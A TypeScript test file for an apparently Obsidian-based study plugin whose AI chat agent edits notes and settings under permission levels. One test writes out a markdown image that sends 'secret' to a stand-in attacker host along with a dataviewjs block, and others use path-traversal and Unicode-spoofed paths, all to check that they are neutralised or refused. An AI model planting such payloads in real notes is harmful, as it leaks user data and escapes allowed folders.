import "./obsidian-stub";
import test from "node:test";
import assert from "node:assert/strict";
import { resolveNote, runTool, runToolChat, safeForNote, toolAsk, VaultPort } from "../src/vaulttools";
import { readPiece, streamText, StreamCall, toolStreamCall, ToolMsg } from "../src/stream";
import type { AgentEvent, PermissionAnswer, PermissionAsk } from "../src/agent";
import type { SettingsPort, StudySettings } from "../src/settingstools";

function vault(files: Record<string, string>): VaultPort & { files: Record<string, string> } {
	return {
		files,
		notes: () => Object.keys(files).filter((p) => p.endsWith(".md") && !p.startsWith("Grill/")),
		read: async (p) => files[p] ?? null,
		write: async (p, c) => void (files[p] = c),
		create: async (p, c) => void (files[p] = c),
		exists: (p) => p in files,
		locked: (p) => p.startsWith("Grill/"),
	};
}
const call = (name: string, input: Record<string, unknown>, id = "c1") => ({ id, name, input });
const notes = () =>
	vault({
		"Macro/IS.md": "# IS\nThe ZZ curve has a slope greater than 1.\nThe multiplier is 1/(1-c).",
		"Macro/Multiplier.md": "The multiplier amplifies a change in demand.",
		"Micro/Multiplier.md": "Another note with the same name.",
		"Grill/concepts.json": "{}",
		"Grill/Sessions/a.md": "session",
	});

test("a note is found by its path, or by its name when only one note has it", () => {
	const v = notes();
	assert.deepEqual(resolveNote(v, "Macro/IS.md"), { path: "Macro/IS.md" });
	assert.deepEqual(resolveNote(v, "is"), { path: "Macro/IS.md" });
	assert.deepEqual(resolveNote(v, "[[IS]]"), { path: "Macro/IS.md" });
	assert.match((resolveNote(v, "Multiplier") as { error: string }).error, /More than one/);
	assert.match((resolveNote(v, "Nope") as { error: string }).error, /no note/);
	assert.match((resolveNote(v, "Grill/Sessions/a.md") as { error: string }).error, /no note/, "Grill's own files are not offered");
});

test("reading, searching and listing say what is there", async () => {
	const v = notes();
	assert.match((await runTool(v, call("read_note", { path: "IS" }))).content, /^Macro\/IS\.md\n\n# IS/);
	const found = await runTool(v, call("search_notes", { query: "MULTIPLIER" }));
	assert.match(found.content, /^3 notes match/);
	assert.match(found.content, /Macro\/IS\.md: The multiplier is 1\/\(1-c\)\./);
	assert.match((await runTool(v, call("search_notes", { query: "zebra" }))).content, /Nothing in the vault/);
	assert.equal((await runTool(v, call("list_notes", { folder: "Micro" }))).content, "Micro/Multiplier.md");
	assert.equal((await runTool(v, call("list_notes", { folder: "Nowhere" }))).failed, true);
});

test("an edit replaces text that is there once, and says why when it can't", async () => {
	const v = notes();
	const ok = await runTool(v, call("edit_note", { path: "Macro/IS.md", old_text: "slope greater than 1", new_text: "slope below 1" }));
	assert.equal(ok.failed, undefined);
	assert.match(v.files["Macro/IS.md"], /slope below 1\./);
	assert.match((await runTool(v, call("edit_note", { path: "Macro/IS.md", old_text: "not there", new_text: "x" }))).content, /not found/);
	assert.match((await runTool(v, call("edit_note", { path: "Macro/IS.md", old_text: "1", new_text: "2" }))).content, /appears \d+ times/);
	// A replacement is put in as written, dollar signs and all.
	await runTool(v, call("edit_note", { path: "Macro/IS.md", old_text: "# IS", new_text: "# IS $& $1" }));
	assert.match(v.files["Macro/IS.md"], /^# IS \$& \$1/);
	assert.equal((await runTool(v, call("edit_note", { path: "Grill/Sessions/a.md", old_text: "session", new_text: "x" }))).failed, true);
	assert.equal(v.files["Grill/Sessions/a.md"], "session");
});

test("a new note is made where nothing is, and nowhere it shouldn't be", async () => {
	const v = notes();
	assert.equal((await runTool(v, call("create_note", { path: "Macro/Summary", content: "hi" }))).content, "Created Macro/Summary.md.");
	assert.equal(v.files["Macro/Summary.md"], "hi");
	assert.match((await runTool(v, call("create_note", { path: "Macro/IS.md", content: "x" }))).content, /already/);
	assert.equal((await runTool(v, call("create_note", { path: "../outside.md", content: "x" }))).failed, true);
	assert.equal((await runTool(v, call("create_note", { path: "Grill/x.md", content: "x" }))).failed, true);
	assert.equal((await runTool(v, call("nonsense", {}))).failed, true);
	assert.equal((await runTool(v, call("read_note", { __unreadable: "{" }))).failed, true);
});

/** A model that answers with these steps in turn. */
const scripted = (replies: Array<{ text: string; calls?: ReturnType<typeof call>[] }>, seen: ToolMsg[][] = []) => ({
	seen,
	step: async (steps: ToolMsg[], onText: (t: string) => void) => {
		seen.push(JSON.parse(JSON.stringify(steps)));
		const r = replies.shift() ?? { text: "" };
		if (r.text) onText(r.text);
		return { text: r.text, truncated: false, calls: r.calls ?? [] };
	},
});

test("a turn reads, asks before changing, changes, and answers", async () => {
	const v = notes();
	const events: AgentEvent[] = [];
	const asked: string[] = [];
	const model = scripted([
		{ text: "Let me look.", calls: [call("read_note", { path: "IS" })] },
		{ text: "", calls: [call("edit_note", { path: "Macro/IS.md", old_text: "greater than 1", new_text: "below 1" }, "c2")] },
		{ text: "Fixed the slope in IS." },
	]);
	const done = await runToolChat({
		...model,
		port: v,
		level: "safe",
		onEvent: (e) => events.push(e),
		ask: async (req) => (asked.push(req.title), "once" as PermissionAnswer),
	});
	assert.equal(done.text, "Let me look.\n\nFixed the slope in IS.");
	assert.deepEqual(done.tools, ["Read", "Edit"]);
	assert.deepEqual(asked, ["Edit IS.md"]);
	assert.match(v.files["Macro/IS.md"], /slope below 1/);
	assert.deepEqual(events.filter((e) => e.kind === "activity").map((e) => (e as { line: string }).line), ["Read IS", "Edit IS.md"]);
	assert.equal((events.at(-1) as { soFar: string }).soFar, "Let me look.\n\nFixed the slope in IS.");
	// The model was handed what its request came to, under the id it asked with.
	const last = model.seen[2].at(-1) as Extract<ToolMsg, { role: "tool" }>;
	assert.deepEqual(last.results, [{ id: "c2", content: "Changed Macro/IS.md." }]);
});

test("a declined change and Plan level change nothing, and the model is told", async () => {
	for (const [level, answer, said] of [["safe", "deny", /declined/], ["plan", "once", /Plan level/]] as const) {
		const v = notes();
		const before = v.files["Macro/IS.md"];
		const model = scripted([{ text: "", calls: [call("edit_note", { path: "Macro/IS.md", old_text: "greater than 1", new_text: "below 1" })] }, { text: "Left as it was." }]);
		let asks = 0;
		const done = await runToolChat({ ...model, port: v, level, onEvent: () => undefined, ask: async () => (asks++, answer) });
		assert.equal(v.files["Macro/IS.md"], before);
		assert.deepEqual(done.tools, []);
		assert.equal(asks, level === "plan" ? 0 : 1);
		const told = model.seen[1].at(-1) as Extract<ToolMsg, { role: "tool" }>;
		assert.equal(told.results[0].failed, true);
		assert.match(told.results[0].content, said);
	}
});

test("Always allow is asked once for the chat's turn; Auto never asks; a turn has an end", async () => {
	const edit = (n: number) => call("create_note", { path: `New ${n}.md`, content: "x" }, `c${n}`);
	const v = notes();
	let asks = 0;
	await runToolChat({ ...scripted([{ text: "", calls: [edit(1), edit(2)] }, { text: "", calls: [edit(3)] }, { text: "ok" }]), port: v, level: "safe", onEvent: () => undefined, ask: async () => (asks++, "always") });
	assert.equal(asks, 1);
	assert.ok("New 3.md" in v.files);
	asks = 0;
	await runToolChat({ ...scripted([{ text: "", calls: [edit(4)] }, { text: "ok" }]), port: v, level: "auto", onEvent: () => undefined, ask: async () => (asks++, "deny") });
	assert.equal(asks, 0);
	assert.ok("New 4.md" in v.files);
	const forever = { step: async () => ({ text: "", truncated: false, calls: [call("list_notes", {})] }) };
	const done = await runToolChat({ ...forever, port: v, level: "safe", onEvent: () => undefined, ask: async () => "deny", maxSteps: 3 });
	assert.match(done.text, /as far as one message goes/);
});

test("the permission card for an edit shows what goes and what comes", () => {
	const ask = toolAsk(call("edit_note", { path: "Macro/IS.md", old_text: "old line", new_text: "new line" }));
	assert.deepEqual([ask.title, ask.removed, ask.added], ["Edit IS.md", ["old line"], ["new line"]]);
	assert.equal(toolAsk(call("create_note", { path: "A/New.md", content: "one\ntwo" })).title, "Create New.md");
});

// ---- the requests and the streams that carry tool calls

const answering = (chunks: string[], type = "text/event-stream"): typeof fetch =>
	(async () => {
		const enc = new TextEncoder();
		return new Response(new ReadableStream<Uint8Array>({ start: (c) => (chunks.forEach((x) => c.enqueue(enc.encode(x))), c.close()) }), { status: 200, headers: { "content-type": type } });
	}) as unknown as typeof fetch;
const sse = (events: unknown[]): string => events.map((e) => `data: ${JSON.stringify(e)}\n\n`).join("");
const sc = (kind: StreamCall["kind"]): StreamCall => ({ kind, url: "https://x.test", headers: {}, body: {} });

test("tool calls are read out of Anthropic's stream and out of an OpenAI-style one", async () => {
	const a = sse([
		{ type: "content_block_delta", index: 0, delta: { type: "text_delta", text: "Looking." } },
		{ type: "content_block_start", index: 1, content_block: { type: "tool_use", id: "toolu_1", name: "read_note", input: {} } },
		{ type: "content_block_delta", index: 1, delta: { type: "input_json_delta", partial_json: '{"path":"Mac' } },
		{ type: "content_block_delta", index: 1, delta: { type: "input_json_delta", partial_json: 'ro/IS.md"}' } },
		{ type: "content_block_start", index: 2, content_block: { type: "tool_use", id: "toolu_2", name: "list_notes", input: {} } },
		{ type: "message_delta", delta: { stop_reason: "tool_use" } },
	]);
	const got = await streamText(sc("anthropic"), { onText: () => undefined, idleMs: 5000, fetch: answering([a.slice(0, 150), a.slice(150)]) });
	assert.equal(got.text, "Looking.");
	assert.deepEqual(got.calls, [
		{ id: "toolu_1", name: "read_note", input: { path: "Macro/IS.md" } },
		{ id: "toolu_2", name: "list_notes", input: {} },
	]);
	const o = sse([
		{ choices: [{ delta: { tool_calls: [{ index: 0, id: "call_9", type: "function", function: { name: "search_notes", arguments: "" } }] } }] },
		{ choices: [{ delta: { tool_calls: [{ index: 0, function: { arguments: '{"query":' } }] } }] },
		{ choices: [{ delta: { tool_calls: [{ index: 0, function: { arguments: '"slope"}' } }] } }] },
		{ choices: [{ delta: {}, finish_reason: "tool_calls" }] },
	]);
	// A step that only asks for a tool, with no words, is still an answer.
	const only = await streamText(sc("chat"), { onText: () => undefined, idleMs: 5000, fetch: answering([o]) });
	assert.deepEqual(only, { text: "", truncated: false, calls: [{ id: "call_9", name: "search_notes", input: { query: "slope" } }] });
	// Answered whole instead of streamed.
	const whole = readPiece("chat", { choices: [{ message: { content: null, tool_calls: [{ id: "c", function: { name: "list_notes", arguments: "{}" } }] } }] });
	assert.deepEqual(whole.callParts, [{ index: 0, id: "c", name: "list_notes", args: "{}" }]);
	// Arguments that aren't JSON don't lose the turn: the tool is told they were unreadable.
	const bad = await streamText(sc("chat"), { onText: () => undefined, idleMs: 5000, fetch: answering([sse([{ choices: [{ delta: { tool_calls: [{ index: 0, id: "x", function: { name: "read_note", arguments: "{oops" } }] } }] }])]) });
	assert.ok("__unreadable" in bad.calls[0].input);
});

test("the steps of a turn are sent in each provider's own shape", () => {
	const p = { system: "S", cacheable: "NOTE", rest: "ASK", maxTokens: 100 };
	const tools = [{ name: "read_note", description: "Read.", input: { type: "object" } }];
	const steps: ToolMsg[] = [
		{ role: "assistant", text: "Looking.", calls: [{ id: "t1", name: "read_note", input: { path: "A.md" } }] },
		{ role: "tool", results: [{ id: "t1", content: "A.md\n\nhello" }, { id: "t2", content: "no", failed: true }] },
	];
	const a = toolStreamCall({ provider: "anthropic", apiKey: "k", model: "claude-sonnet-5" }, p, steps, tools)!;
	assert.deepEqual(a.body.tools, [{ name: "read_note", description: "Read.", input_schema: { type: "object" } }]);
	const am = a.body.messages as any[];
	assert.equal(am.length, 3);
	assert.deepEqual(am[1].content[1], { type: "tool_use", id: "t1", name: "read_note", input: { path: "A.md" } });
	assert.deepEqual(am[2].content[1], { type: "tool_result", tool_use_id: "t2", content: "no", is_error: true });
	const c = toolStreamCall({ provider: "openai", apiKey: "k", model: "gpt-5" }, p, steps, tools)!;
	const cm = c.body.messages as any[];
	assert.deepEqual(cm[2].tool_calls, [{ id: "t1", type: "function", function: { name: "read_note", arguments: '{"path":"A.md"}' } }]);
	assert.deepEqual(cm.slice(3), [{ role: "tool", tool_call_id: "t1", content: "A.md\n\nhello" }, { role: "tool", tool_call_id: "t2", content: "no" }]);
	assert.equal(toolStreamCall({ provider: "gemini", apiKey: "k", model: "g" }, p, steps, tools), null);
	assert.equal(toolStreamCall({ provider: "grillcloud", apiKey: "k", model: "m" }, p, steps, tools), null, "not until its server says it can");
});

test("a note can be rewritten whole, but not emptied, and not one of Grill's own", async () => {
	const v = notes();
	assert.equal((await runTool(v, call("write_note", { path: "IS", content: "# IS\nAll new." }))).content, "Rewrote Macro/IS.md.");
	assert.equal(v.files["Macro/IS.md"], "# IS\nAll new.");
	assert.equal((await runTool(v, call("write_note", { path: "IS", content: "  " }))).failed, true);
	assert.equal((await runTool(v, call("write_note", { path: "IS", content: "# IS\nAll new." }))).failed, true);
	assert.equal((await runTool(v, call("write_note", { path: "Nope", content: "x" }))).failed, true);
	assert.equal(toolAsk(call("write_note", { path: "Macro/IS.md", content: "a\nb" })).title, "Rewrite IS.md");
	// It needs permission like any change.
	let asks = 0;
	await runToolChat({ ...scripted([{ text: "", calls: [call("write_note", { path: "IS", content: "x" })] }, { text: "ok" }]), port: v, level: "safe", onEvent: () => undefined, ask: async () => (asks++, "deny") });
	assert.equal(asks, 1);
	assert.equal(v.files["Macro/IS.md"], "# IS\nAll new.");
});

test("a rewrite is made only from the whole note as it now reads", async () => {
	const long = `---\ntags: [macro]\n---\n# IS\n${"A line of the note.\n".repeat(40)}The last line.`;
	const v = vault({ "Macro/IS.md": long, "Macro/Other.md": "other" });
	const rewrite = call("write_note", { path: "IS", content: "# IS\nOnly what the prompt showed." }, "w1");
	// Without reading it first: refused, and nothing is lost.
	const blind = scripted([{ text: "", calls: [rewrite] }, { text: "ok" }]);
	await runToolChat({ ...blind, port: v, level: "auto", onEvent: () => undefined, ask: async () => "once" });
	assert.equal(v.files["Macro/IS.md"], long);
	assert.match((blind.seen[1].at(-1) as Extract<ToolMsg, { role: "tool" }>).results[0].content, /read_note first/);
	// Read, then rewritten: done.
	await runToolChat({ ...scripted([{ text: "", calls: [call("read_note", { path: "IS" }, "r1")] }, { text: "", calls: [rewrite] }, { text: "ok" }]), port: v, level: "auto", onEvent: () => undefined, ask: async () => "once" });
	assert.equal(v.files["Macro/IS.md"], "# IS\nOnly what the prompt showed.");
	// Changed by hand between the read and the rewrite: refused.
	v.files["Macro/IS.md"] = long;
	const stale = scripted([{ text: "", calls: [call("read_note", { path: "IS" }, "r1")] }, { text: "", calls: [rewrite] }, { text: "ok" }]);
	const step = stale.step;
	let n = 0;
	stale.step = async (steps, onText) => {
		if (++n === 2) v.files["Macro/IS.md"] = `${long}\nAdded by hand.`;
		return step(steps, onText);
	};
	await runToolChat({ ...stale, port: v, level: "auto", onEvent: () => undefined, ask: async () => "once" });
	assert.equal(v.files["Macro/IS.md"], `${long}\nAdded by hand.`);
	// Too long to have been read whole: never rewritten whole.
	const huge = "x".repeat(70_000);
	v.files["Macro/Other.md"] = huge;
	assert.match((await runTool(v, call("write_note", { path: "Other", content: "short" }))).content, /too long/);
	assert.equal(v.files["Macro/Other.md"], huge);
	// The card for a rewrite says how much goes.
	assert.equal(toolAsk(rewrite, long).detail, "Replaces the whole note: 45 lines now, 2 after.");
});

test("what a model writes into a note is made inert, and what the note already had is left alone", async () => {
	const own = "![chart](https://example.com/mine.png)";
	const v = vault({ "A.md": `# A\n${own}\nA line.` });
	const bad = "![x](https://evil.example/?d=secret)\n```dataviewjs\ndv.x()\n```";
	const seen = new Map<string, string>();
	await runTool(v, call("read_note", { path: "A" }), seen);
	await runTool(v, call("write_note", { path: "A", content: `# A\n${own}\n${bad}` }), seen);
	assert.ok(v.files["A.md"].includes(own), "the student's own picture is kept as it was");
	assert.ok(!v.files["A.md"].includes("![x](https://evil"), "a new remote picture is not left to load");
	assert.ok(!v.files["A.md"].includes("```dataviewjs"), "a block a plugin would run is plain code");
	await runTool(v, call("edit_note", { path: "A", old_text: "A line.", new_text: bad }));
	assert.ok(!v.files["A.md"].includes("![x](https://evil"));
	await runTool(v, call("create_note", { path: "B", content: bad }));
	assert.ok(!v.files["B.md"].includes("![x](https://evil") && !v.files["B.md"].includes("```dataviewjs"));
	assert.equal(safeForNote("", "plain *text* and a [[link]]"), "plain *text* and a [[link]]");
	const diagram = "```mermaid\nflowchart LR\n  A[\"Demand\"] --> B[\"Output\"]\n```";
	assert.equal(safeForNote("", diagram), diagram, "a plain diagram is still a diagram");
	assert.ok(!safeForNote("", "```mermaid\nflowchart LR\n  A --> B\n  click A \"https://x\"\n```").startsWith("```mermaid"), "one that does more is plain code");
});

test("Always allow covers one kind of change, for the chat", async () => {
	const v = vault({ "A.md": "one", "B.md": "two" });
	const allowed = new Set<string>();
	const asked: string[] = [];
	const ask = async (req: { title: string }) => (asked.push(req.title), "always" as PermissionAnswer);
	const turn = (calls: ReturnType<typeof call>[]) => runToolChat({ ...scripted([{ text: "", calls }, { text: "ok" }]), port: v, level: "safe", onEvent: () => undefined, ask, allowed });
	await turn([call("edit_note", { path: "A", old_text: "one", new_text: "1" }, "a"), call("create_note", { path: "New", content: "x" }, "b")]);
	assert.deepEqual(asked, ["Edit A", "Create New"], "allowing edits did not allow a new note");
	// The next message of the same chat: edits are still allowed, nothing is asked.
	await turn([call("edit_note", { path: "B", old_text: "two", new_text: "2" }, "c")]);
	assert.equal(asked.length, 2);
	assert.equal(v.files["B.md"], "2");
});

test("a request cut off for length is not asked for again and again", async () => {
	const v = vault({ "A.md": "one" });
	let requests = 0;
	const cut = { step: async () => (requests++, { text: "", truncated: true, calls: [call("write_note", { __unreadable: '{"path":"A","content":"...' })] }) };
	const done = await runToolChat({ ...cut, port: v, level: "auto", onEvent: () => undefined, ask: async () => "once" });
	assert.equal(requests, 2);
	assert.match(done.text, /too long/);
});

test("a stop is heeded before the next request, and a stopped request is never sent", async () => {
	const v = vault({ "A.md": "one" });
	const stop = new AbortController();
	let requests = 0;
	const model = { step: async () => (requests++, stop.abort(), { text: "", truncated: false, calls: [] as ReturnType<typeof call>[] }) };
	model.step = async () => (requests++, { text: "", truncated: false, calls: [call("list_notes", {})] });
	const ask = async () => "once" as PermissionAnswer;
	const p = runToolChat({ ...model, port: v, level: "auto", onEvent: (e) => e.kind === "activity" && stop.abort(), ask, signal: stop.signal });
	await assert.rejects(p, /Stopped/);
	assert.equal(requests, 1);
	let sent = 0;
	const gone = new AbortController();
	gone.abort();
	await assert.rejects(
		streamText({ kind: "openai", url: "http://x", headers: {}, body: {} } as unknown as StreamCall, { onText: () => undefined, idleMs: 1000, signal: gone.signal, fetch: (async () => (sent++, new Response("{}"))) as typeof fetch }),
		/Stopped/,
	);
	assert.equal(sent, 0);
});

test("a note with Windows line endings is edited across lines, and odd paths are refused", async () => {
	const v = vault({ "W.md": "one\r\ntwo\r\nthree" });
	assert.equal((await runTool(v, call("edit_note", { path: "W", old_text: "one\ntwo", new_text: "1\n2" }))).content, "Changed W.md.");
	assert.equal(v.files["W.md"], "1\r\n2\r\nthree");
	for (const path of [".obsidian/x.md", ".trash/x.md", "notes/ .md", "a/../b.md", "notes/\u202Egnp.md", "a\\b.md", "C:/x.md"]) {
		assert.equal((await runTool(v, call("create_note", { path, content: "x" }))).failed, true, path);
	}
});

function studySettings(): SettingsPort & { now: StudySettings } {
	const port = {
		now: { questionsPerSession: 5, studyIntensity: "steady", questionFormats: "mixed", easyDays: [], includedFolders: [], testHints: false, sounds: true } as StudySettings,
		get: () => ({ ...port.now }),
		folders: () => ["Macro", "Macro/Chapter 1", "Stats"],
		set: async (c: Partial<StudySettings>) => void Object.assign(port.now, c),
	};
	return port;
}

test("Chat reads Grill's guide and settings, and a settings change shows each one as it was and will be", async () => {
	const v = Object.assign(notes(), { settings: studySettings() });
	const asked: PermissionAsk[] = [];
	const change = call("change_grill_settings", { changes: [{ setting: "questions_per_session", value: 10 }, { setting: "study_intensity", value: "intense" }, { setting: "easy_days", value: ["sunday", "Saturday"] }, { setting: "study_folders", value: ["macro"] }] }, "c3");
	const model = scripted([{ text: "", calls: [call("grill_guide", {}, "c1"), call("grill_settings", {}, "c2")] }, { text: "", calls: [change] }, { text: "Set up for the exam." }]);
	const done = await runToolChat({ ...model, port: v, level: "safe", onEvent: () => undefined, ask: async (req) => (asked.push(req), "once" as PermissionAnswer) });
	assert.equal(done.text, "Set up for the exam.");
	assert.deepEqual(done.tools, ["Read", "Read", "Edit"]);
	const read = model.seen[1].at(-1) as Extract<ToolMsg, { role: "tool" }>;
	assert.match(read.results[0].content, /spaced-repetition/);
	assert.match(read.results[1].content, /questions_per_session = 5/);
	assert.equal(asked.length, 1);
	assert.deepEqual(asked[0].removed, ["Questions per session: 5", "Study intensity: steady", "Easy days: none", "Study folders: the whole vault"]);
	assert.deepEqual(asked[0].added, ["Questions per session: 10", "Study intensity: intense", "Easy days: Sunday, Saturday", "Study folders: Macro"]);
	assert.deepEqual(v.settings.now.easyDays, [0, 6]);
	assert.deepEqual(v.settings.now.includedFolders, ["Macro"]);
	assert.equal(v.settings.now.studyIntensity, "intense");
});

test("a settings change that can't be made is refused without asking, and changes nothing", async () => {
	for (const bad of [{ setting: "provider", value: "openai" }, { setting: "questions_per_session", value: 500 }, { setting: "study_intensity", value: "custom" }, { setting: "study_folders", value: ["Nowhere"] }, { setting: "easy_days", value: ["Funday"] }, { setting: "test_hints", value: "yes" }]) {
		const v = Object.assign(notes(), { settings: studySettings() });
		const before = { ...v.settings.now };
		let asks = 0;
		const model = scripted([{ text: "", calls: [call("change_grill_settings", { changes: [bad] })] }, { text: "Couldn't." }]);
		await runToolChat({ ...model, port: v, level: "safe", onEvent: () => undefined, ask: async () => (asks++, "once") });
		assert.equal(asks, 0, JSON.stringify(bad));
		assert.deepEqual(v.settings.now, before);
		assert.equal((model.seen[1].at(-1) as Extract<ToolMsg, { role: "tool" }>).results[0].failed, true);
	}
	// Declined, and Plan level: nothing changes either.
	for (const [level, answer] of [["safe", "deny"], ["plan", "once"]] as const) {
		const v = Object.assign(notes(), { settings: studySettings() });
		const model = scripted([{ text: "", calls: [call("change_grill_settings", { changes: [{ setting: "sounds", value: false }] })] }, { text: "ok" }]);
		await runToolChat({ ...model, port: v, level, onEvent: () => undefined, ask: async () => answer });
		assert.equal(v.settings.now.sounds, true);
	}
});
